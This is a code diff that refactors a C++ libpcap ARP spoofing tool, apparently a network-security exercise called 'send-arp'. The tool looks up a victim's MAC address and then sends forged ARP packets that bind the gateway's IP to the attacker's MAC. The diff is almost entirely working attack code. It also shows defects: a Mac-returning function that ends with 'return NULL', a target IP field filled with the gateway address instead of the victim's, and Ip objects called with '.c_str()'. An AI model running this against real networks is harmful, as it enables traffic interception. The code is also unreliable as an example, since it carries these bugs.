@@ -17,8 +17,8 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-string myIp;
-string myMac; //my(Attacker Mac)
+Mac myMac;
+Ip myIp;
 
 pcap_t* handle;
 
@@ -27,11 +27,11 @@ void usage() {
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-string send_arp(string vicIp){
+Mac send_arp(Ip targetIp){
 	EthArpPacket packet; //arp request packet
 
 	//sender = ma, target = victim
-	packet.eth_.smac_ = Mac(myMac);
+	packet.eth_.smac_ = myMac;
 	packet.eth_.dmac_ = Mac::broadcastMac(); //broadcast mac
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -42,12 +42,12 @@ string send_arp(string vicIp){
 	packet.arp_.op_ = htons(ArpHdr::Request);
 	
 	//My info
-	packet.arp_.smac_ = Mac(myMac);
-	packet.arp_.sip_ = htonl(Ip(myIp));
+	packet.arp_.smac_ = myMac;
+	packet.arp_.sip_ = htonl(myIp);
 
 	//Victim
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //anyting
-	packet.arp_.tip_ = htonl(Ip(vicIp));
+	packet.arp_.tip_ = htonl(targetIp);
 	
 	while (true){
    		int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));                                               
@@ -73,8 +73,8 @@ string send_arp(string vicIp){
 		//Check reply packet
 		if(arp_hdr->op()!=ArpHdr::Reply) continue;
 		//Check correct sender
-		if(arp_hdr->sip()!=Ip(vicIp)) continue;
-		return static_cast<string>(arp_hdr->smac());	
+		if(arp_hdr->sip()!=targetIp) continue;
+		return Mac(static_cast<string>(arp_hdr->smac()));	
 	}
 	return NULL;
 }
@@ -85,7 +85,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	char* interf = argv[1]; //interface
+	const char* interf = argv[1]; //interface
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
@@ -101,14 +101,14 @@ int main(int argc, char* argv[]) {
 
 	// Process each (Sender, Target) pair
 	for (int i = 2; i < argc; i += 2) {
-		string vicIp = argv[i];      // Sender IP
-		string gateIp = argv[i + 1]; // Target IP
+		Ip senderIp = Ip(argv[i]);      // Sender IP
+		Ip targetIp = Ip(argv[i + 1]); // Target IP
 
-		string vicMac = send_arp(vicIp);
+		Mac senderMac = send_arp(senderIp);
 
 		EthArpPacket packet;
-		packet.eth_.smac_ = Mac(myMac);
-		packet.eth_.dmac_ = Mac(vicMac);
+		packet.eth_.smac_ = myMac;
+		packet.eth_.dmac_ = senderMac;
 		packet.eth_.type_ = htons(EthHdr::Arp);
 
 		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -118,16 +118,16 @@ int main(int argc, char* argv[]) {
 
 		packet.arp_.op_ = htons(ArpHdr::Request);
 		// My mac
-		packet.arp_.smac_ = Mac(myMac);
+		packet.arp_.smac_ = myMac;
 		// Target ip(gateway)
-		packet.arp_.sip_ = htonl(Ip(gateIp));
+		packet.arp_.sip_ = htonl(targetIp);
 
 		// Victim
-		packet.arp_.tmac_ = Mac(vicMac);
-		packet.arp_.tip_ = htonl(Ip(gateIp));
+		packet.arp_.tmac_ = senderMac;
+		packet.arp_.tip_ = htonl(targetIp);
 
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", vicIp.c_str(), gateIp.c_str());
+		//printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
